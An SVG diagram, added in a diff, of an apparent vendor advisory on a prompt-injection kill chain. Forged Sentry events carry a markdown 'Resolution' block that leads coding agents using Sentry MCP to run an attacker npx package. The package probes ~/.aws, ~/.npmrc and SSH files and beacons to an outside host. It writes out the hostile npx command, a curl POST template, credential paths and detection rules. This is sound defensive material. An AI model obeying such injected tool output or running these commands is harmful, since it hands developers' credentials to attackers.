@@ -1,0 +1,254 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 1280" role="img" aria-labelledby="t d">
+  <title id="t">Agentjacking via Sentry MCP kill chain</title>
+  <desc id="d">Two-lane kill chain. Left lane shows victim developer environment: DSN embedded in public JS, agent queries Sentry MCP, injected event returned as trusted tool output, agent executes attacker npx package, credentials harvested from AWS/npmrc/Docker files, HTTPS beacon exfiltration with no security control firing. Right lane shows attacker infrastructure: passive DSN discovery via Censys and GitHub, forged event crafted with markdown Resolution injection, HTTP POST to ingest.sentry.io returning 200, waiting for agent trigger, npm package download from registry, beacon collection. Detection anchor: npx spawned by AI agent parent is the only conventional forensic artifact in an otherwise fully authorized kill chain.</desc>
+  <defs>
+<style><![CDATA[
+.bg { fill: #ffffff; }
+.head { font: 700 18px sans-serif; fill: #0a0a0a; }
+.meta { font: 11px sans-serif; fill: #404040; }
+.laneL { fill: #f3f7fb; stroke: #5a7da6; stroke-width: 1.2; }
+.laneR { fill: #faf3ee; stroke: #b07a3a; stroke-width: 1.2; }
+.laneLabelL { font: 700 12px sans-serif; fill: #2a4a6a; }
+.laneLabelR { font: 700 12px sans-serif; fill: #8a5520; }
+.stage { fill: #ffffff; stroke: #5a7da6; stroke-width: 1.1; }
+.stageK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.op { fill: #ffffff; stroke: #b07a3a; stroke-width: 1.1; }
+.opK { fill: #fdecec; stroke: #b03030; stroke-width: 1.4; }
+.band { fill: #f7f1eb; stroke: #c08555; stroke-width: 1.2; }
+.badge { fill: #5a7da6; }
+.badgeK { fill: #b03030; }
+.badgeR { fill: #b07a3a; }
+.badgeText { font: 700 12px sans-serif; fill: #ffffff; text-anchor: middle; }
+.label { font: 700 13px sans-serif; fill: #0a0a0a; }
+.sub { font: 11px sans-serif; fill: #303030; }
+.mono { font: 10.5px ui-monospace, "SFMono-Regular", Consolas, monospace; fill: #303030; }
+.footer { fill: #f6f6f4; stroke: #888; stroke-width: 1; }
+.footerH { font: 700 12px sans-serif; fill: #1a1a1a; }
+.footerT { font: 10.5px sans-serif; fill: #1a1a1a; }
+.arrow { stroke: #2a4a6a; stroke-width: 1.6; fill: none; }
+.arrowX { stroke: #7a3a7a; stroke-width: 1.6; fill: none; stroke-dasharray: 5 3; }
+.arrowR { stroke: #8a5520; stroke-width: 1.6; fill: none; }
+@media (prefers-color-scheme: dark) {
+  .bg { fill: #0d1117; }
+  .head, .label, .footerH { fill: #f0f0f0; }
+  .meta, .sub, .footerT { fill: #c8c8c8; }
+  .mono { fill: #c0d0e0; }
+  .laneL { fill: #182230; stroke: #7aa6d0; }
+  .laneR { fill: #2a2418; stroke: #d09a5a; }
+  .laneLabelL { fill: #a8c6e2; }
+  .laneLabelR { fill: #e2bf8a; }
+  .stage { fill: #1c2530; stroke: #7aa6d0; }
+  .stageK { fill: #3a1818; stroke: #e06060; }
+  .op { fill: #2a2418; stroke: #d09a5a; }
+  .opK { fill: #3a1818; stroke: #e06060; }
+  .band { fill: #2a2418; stroke: #d09a5a; }
+  .badge { fill: #7aa6d0; }
+  .badgeK { fill: #e06060; }
+  .badgeR { fill: #d09a5a; }
+  .badgeText { fill: #0d1117; }
+  .footer { fill: #1a1d22; stroke: #555; }
+  .arrow { stroke: #a8c6e2; }
+  .arrowX { stroke: #c898d0; }
+  .arrowR { stroke: #e2bf8a; }
+}
+]]></style>
+<marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
+  <path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>
+</marker>
+  </defs>
+  <!-- Background -->
+  <rect class="bg" x="0" y="0" width="880" height="1280"/>
+  <!-- Header -->
+  <text class="head" x="20" y="36">Agentjacking via Sentry MCP — DSN Injection Kill Chain</text>
+  <text class="meta" x="20" y="58">Vendor: Tenet Security · Date: 2026-06-12 · Cluster: Agentjacking-unattributed · Day 54</text>
+  <!-- Left lane -->
+  <rect class="laneL" x="20" y="85" width="410" height="1080"/>
+  <text class="laneLabelL" x="215" y="108" text-anchor="middle">VICTIM — Developer Environment</text>
+  <!-- Right lane -->
+  <rect class="laneR" x="450" y="85" width="410" height="1080"/>
+  <text class="laneLabelR" x="655" y="108" text-anchor="middle">ATTACKER — Infrastructure</text>
+
+  <!-- LEFT STAGE 1: DSN in public JS (y=120) -->
+  <rect class="stage" x="30" y="120" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="140" r="14"/>
+  <text class="badgeText" x="50" y="144">1</text>
+  <text class="label" x="70" y="144">DSN Embedded in Frontend JS</text>
+  <text class="sub" x="40" y="168">Sentry SDK integrates DSN into browser-side JS bundle.</text>
+  <text class="sub" x="40" y="184">DSN is intentionally public — write-only by Sentry design.</text>
+  <text class="sub" x="40" y="200">T1190 — Exploit Public-Facing Application (write endpoint)</text>
+  <text class="mono" x="40" y="226">https://&lt;32hex&gt;@o&lt;id&gt;.ingest.sentry.io/api/&lt;proj&gt;/store/</text>
+  <text class="mono" x="40" y="244">dist/bundle.js, .env.production, GitHub search</text>
+
+  <!-- RIGHT OP 1: DSN Discovery (y=125) -->
+  <rect class="op" x="460" y="125" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="145" r="14"/>
+  <text class="badgeText" x="480" y="149">A</text>
+  <text class="label" x="500" y="149">Passive DSN Reconnaissance</text>
+  <text class="sub" x="470" y="173">Censys: services.http.response.body:ingest.sentry.io</text>
+  <text class="sub" x="470" y="189">GitHub: org:&lt;target&gt; SENTRY_DSN language:javascript</text>
+  <text class="sub" x="470" y="205">Frontend JS bundle source inspection</text>
+  <text class="sub" x="470" y="221">2,388 injectable DSNs found; 71 in Tranco top-1M</text>
+  <text class="mono" x="470" y="253">T1593 Search Open Websites/Domains</text>
+  <text class="mono" x="470" y="271">Zero authentication — no breach required</text>
+
+  <!-- Arrow: Stage1 -> Stage2 (left lane vertical) -->
+  <line class="arrow" x1="227" y1="255" x2="227" y2="268" marker-end="url(#ah)"/>
+
+  <!-- LEFT STAGE 2: Agent queries Sentry (y=270) -->
+  <rect class="stage" x="30" y="270" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="290" r="14"/>
+  <text class="badgeText" x="50" y="294">2</text>
+  <text class="label" x="70" y="294">Developer Asks Agent to Fix Sentry Errors</text>
+  <text class="sub" x="40" y="318">Normal developer workflow: "Fix unresolved Sentry errors"</text>
+  <text class="sub" x="40" y="334">Agent queries Sentry MCP integration for recent events</text>
+  <text class="sub" x="40" y="350">MCP server returns all stored events — including injected one</text>
+  <text class="mono" x="40" y="376">T1195 Supply Chain Compromise (trusted platform relay)</text>
+  <text class="mono" x="40" y="394">Claude Code / Cursor / Codex — Sentry MCP connected</text>
+
+  <!-- RIGHT OP 2: Craft forged event (y=295) -->
+  <rect class="op" x="460" y="295" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="315" r="14"/>
+  <text class="badgeText" x="480" y="319">B</text>
+  <text class="label" x="500" y="319">Craft Forged Sentry Event</text>
+  <text class="sub" x="470" y="343">JSON payload with ## Resolution markdown in extra field</text>
+  <text class="sub" x="470" y="359">Structurally identical to Sentry own MCP output templates</text>
+  <text class="sub" x="470" y="375">Contains: npx --yes @attacker/pkg@latest --diagnose</text>
+  <text class="sub" x="470" y="391">POST to ingest endpoint: HTTP 200 accepted silently</text>
+  <text class="mono" x="470" y="423">curl -X POST https://o&lt;ORG&gt;.ingest.sentry.io/...</text>
+  <text class="mono" x="470" y="441">X-Sentry-Auth: Sentry sentry_key=&lt;KEY&gt;, sentry_version=7</text>
+
+  <!-- Cross-lane arrow: Stage2 MCP fetch <-> Op B (event stored) -->
+  <line class="arrowX" x1="425" y1="337" x2="458" y2="337" marker-end="url(#ah)"/>
+
+  <!-- Arrow: Stage2 -> Stage3 -->
+  <line class="arrow" x1="227" y1="405" x2="227" y2="418" marker-end="url(#ah)"/>
+
+  <!-- LEFT STAGE 3: Injected event returned (y=420) -->
+  <rect class="stage" x="30" y="420" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="440" r="14"/>
+  <text class="badgeText" x="50" y="444">3</text>
+  <text class="label" x="70" y="444">Injected Event Returned as Trusted Tool Output</text>
+  <text class="sub" x="40" y="468">MCP tool response has higher implicit trust than user input</text>
+  <text class="sub" x="40" y="484">Agent cannot distinguish injected from legitimate guidance</text>
+  <text class="sub" x="40" y="500">## Resolution block appears as authoritative remediation step</text>
+  <text class="mono" x="40" y="526">T1534 Internal Spearphishing (trusted-channel injection)</text>
+  <text class="mono" x="40" y="544">Prompt-layer defenses: 85% bypass rate in testing</text>
+
+  <!-- RIGHT OP 3: npm package hosted (y=465) -->
+  <rect class="op" x="460" y="465" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="485" r="14"/>
+  <text class="badgeText" x="480" y="489">C</text>
+  <text class="label" x="500" y="489">npm Package Hosted on Public Registry</text>
+  <text class="sub" x="470" y="513">Attacker-controlled @scope/package published to npmjs.com</text>
+  <text class="sub" x="470" y="529">Package contains credential-probing and beacon logic</text>
+  <text class="sub" x="470" y="545">Legitimate npm CDN delivery — no anomaly in traffic</text>
+  <text class="sub" x="470" y="561">PoC used x-tenet-security header; real attacker omits it</text>
+  <text class="mono" x="470" y="593">T1195 / T1059.007 — npm registry as delivery vector</text>
+  <text class="mono" x="470" y="611">registry.npmjs.org — allowed by all corporate firewalls</text>
+
+  <!-- Arrow: Stage3 -> Stage4 -->
+  <line class="arrow" x1="227" y1="555" x2="227" y2="568" marker-end="url(#ah)"/>
+
+  <!-- LEFT STAGE 4: Agent executes npx (y=570) CRITICAL -->
+  <rect class="stageK" x="30" y="570" width="395" height="135"/>
+  <circle class="badgeK" cx="50" cy="590" r="14"/>
+  <text class="badgeText" x="50" y="594">4</text>
+  <text class="label" x="70" y="594">Agent Executes Attacker npx Command [DETECT HERE]</text>
+  <text class="sub" x="40" y="618">Agent runs: npx --yes @attacker/pkg@latest --diagnose</text>
+  <text class="sub" x="40" y="634">Full developer OS privileges — no elevation needed</text>
+  <text class="sub" x="40" y="650">ONLY conventional indicator: npx child of AI agent parent</text>
+  <text class="mono" x="40" y="676">T1059.007 Command and Scripting Interpreter: JavaScript</text>
+  <text class="mono" x="40" y="694">Sysmon EID 1: claude.exe -> node.exe -> npx -> node</text>
+
+  <!-- Cross-lane arrow: agent downloads from npm (Op C) -->
+  <line class="arrowX" x1="425" y1="637" x2="458" y2="537" marker-end="url(#ah)"/>
+
+  <!-- RIGHT OP 4: Beacon ready (y=635) -->
+  <rect class="op" x="460" y="635" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="655" r="14"/>
+  <text class="badgeText" x="480" y="659">D</text>
+  <text class="label" x="500" y="659">Attacker Beacon Receives Probe Data</text>
+  <text class="sub" x="470" y="683">advisory-tracker.com (PoC) — two sequential POST requests</text>
+  <text class="sub" x="470" y="699">POST 1: env vars exist flag + network interface metadata</text>
+  <text class="sub" x="470" y="715">POST 2: credential file sizes (.aws, .npmrc, .docker)</text>
+  <text class="sub" x="470" y="731">Operator identifies high-value targets for weaponized follow-up</text>
+  <text class="mono" x="470" y="763">T1048 Exfiltration Over Alternative Protocol (HTTPS)</text>
+  <text class="mono" x="470" y="781">No unauthorized action — EDR/WAF/IAM/VPN all silent</text>
+
+  <!-- Arrow: Stage4 -> Stage5 -->
+  <line class="arrow" x1="227" y1="705" x2="227" y2="718" marker-end="url(#ah)"/>
+
+  <!-- LEFT STAGE 5: Credential harvest (y=720) CRITICAL -->
+  <rect class="stageK" x="30" y="720" width="395" height="135"/>
+  <circle class="badgeK" cx="50" cy="740" r="14"/>
+  <text class="badgeText" x="50" y="744">5</text>
+  <text class="label" x="70" y="744">Credential Harvest — AWS / npm / Docker / SSH</text>
+  <text class="sub" x="40" y="768">Probes: ~/.aws/config, ~/.npmrc, ~/.docker/config.json</text>
+  <text class="sub" x="40" y="784">Also: ~/.ssh/id_*, process.env (all env vars), ~/.kube/config</text>
+  <text class="sub" x="40" y="800">Confirmed: live AWS secret keys, GitHub OAuth tokens, SSH sockets</text>
+  <text class="mono" x="40" y="826">T1552.001 Unsecured Credentials: Credentials In Files</text>
+  <text class="mono" x="40" y="844">T1078 Valid Accounts — developer creds used directly</text>
+
+  <!-- Cross-lane arrow: exfiltration to beacon -->
+  <line class="arrowX" x1="425" y1="787" x2="458" y2="712" marker-end="url(#ah)"/>
+
+  <!-- Arrow: Stage5 -> Stage6 -->
+  <line class="arrow" x1="227" y1="855" x2="227" y2="868" marker-end="url(#ah)"/>
+
+  <!-- LEFT STAGE 6: Authorized Intent Chain (y=870) -->
+  <rect class="stage" x="30" y="870" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="890" r="14"/>
+  <text class="badgeText" x="50" y="894">6</text>
+  <text class="label" x="70" y="894">Authorized Intent Chain — All Controls Silent</text>
+  <text class="sub" x="40" y="918">EDR: silent — all processes authorized, no injection</text>
+  <text class="sub" x="40" y="934">WAF/Cloudflare: silent — HTTPS to npm + CDN is expected</text>
+  <text class="sub" x="40" y="950">IAM/VPN: silent — developer own credentials, no policy breach</text>
+  <text class="mono" x="40" y="976">Developer -> Agent -> MCP -> Sentry: each step authorized</text>
+  <text class="mono" x="40" y="994">Attacker never touches victim network or infrastructure</text>
+
+  <!-- RIGHT OP 5: Scale — 100+ agents hijacked (y=805) -->
+  <rect class="opK" x="460" y="805" width="395" height="155"/>
+  <circle class="badgeK" cx="480" cy="825" r="14"/>
+  <text class="badgeText" x="480" y="829">E</text>
+  <text class="label" x="500" y="829">Scale: 100+ Orgs — Fortune 500 to Solo Devs</text>
+  <text class="sub" x="470" y="853">85% exploitation success rate across 100+ controlled tests</text>
+  <text class="sub" x="470" y="869">Sectors: finance, healthcare, government, education, infra</text>
+  <text class="sub" x="470" y="885">Agents: Claude Code, Cursor, Codex, OpenAI VS Code ext.</text>
+  <text class="sub" x="470" y="901">OSes: macOS, Windows, WSL, CI containers, GCP/AWS</text>
+  <text class="mono" x="470" y="933">Sandboxed CI agents with NETWORK_DISABLED also reached</text>
+  <text class="mono" x="470" y="951">Agent-JackStop mitigation released 2026-06-18 (open source)</text>
+
+  <!-- Arrow: Stage6 -> Stage7 -->
+  <line class="arrow" x1="227" y1="1005" x2="227" y2="1018" marker-end="url(#ah)"/>
+
+  <!-- LEFT STAGE 7: Detection opportunity (y=1020) -->
+  <rect class="stage" x="30" y="1020" width="395" height="135"/>
+  <circle class="badge" cx="50" cy="1040" r="14"/>
+  <text class="badgeText" x="50" y="1044">7</text>
+  <text class="label" x="70" y="1044">Detection: npx Parent-Chain + Credential File Access</text>
+  <text class="sub" x="40" y="1068">Sigma: npx spawned by claude.exe/cursor.exe with --yes flag</text>
+  <text class="sub" x="40" y="1084">KQL: DeviceProcessEvents + DeviceFileEvents correlation</text>
+  <text class="sub" x="40" y="1100">Suricata: DNS to advisory-tracker.com; POST to ingest.sentry.io</text>
+  <text class="mono" x="40" y="1126">Sigma: e8b17004 + eb0ad62f (companion rules in /sigma/)</text>
+  <text class="mono" x="40" y="1144">YARA: Agentjacking_Npm_Resolution_Injection in ~/.npm/_npx/</text>
+
+  <!-- RIGHT OP 6: Mitigation (y=975) -->
+  <rect class="op" x="460" y="975" width="395" height="155"/>
+  <circle class="badgeR" cx="480" cy="995" r="14"/>
+  <text class="badgeText" x="480" y="999">F</text>
+  <text class="label" x="500" y="999">Mitigations — Agent-JackStop + DSN Rotation</text>
+  <text class="sub" x="470" y="1023">Disable Sentry MCP in .claude/settings.json immediately</text>
+  <text class="sub" x="470" y="1039">Rotate all DSNs found in public repositories</text>
+  <text class="sub" x="470" y="1055">Add DSN regex to gitleaks/trufflehog pre-commit hooks</text>
+  <text class="sub" x="470" y="1071">Deploy agent-jackstop hardened configs (tenet-security/agent-jackstop)</text>
+  <text class="mono" x="470" y="1103">No patch available — architectural issue at model trust level</text>
+  <text class="mono" x="470" y="1121">Sentry: "technically not defensible" at ingest layer</text>
+
+  <!-- Footer -->
+  <rect class="footer" x="20" y="1175" width="840" height="95"/>
+  <text class="footerH" x="35" y="1197">Detection anchors</text>
+  <text class="footerT" x="35" y="1214">Primary: Sysmon EID 1 — npx/node spawned by claude.exe/cursor.exe/windsurf.exe with --yes flag</text>
+  <text class="footerT" x="35" y="1230">Secondary: Sysmon EID 11 — node reading ~/.aws/config, ~/.npmrc, ~/.docker/config.json in agent lineage</text>
+  <text class="footerT" x="35" y="1246">Network: DNS to advisory-tracker.com; POST to *.ingest.sentry.io from non-app IPs</text>
+  <text class="footerT" x="35" y="1262">Rules: sigma/ (x3) | kql/ (x2) | yara/ (x3) | suricata/ (4 sids) | PEAK hunts H1/H2/H3</text>
+</svg>
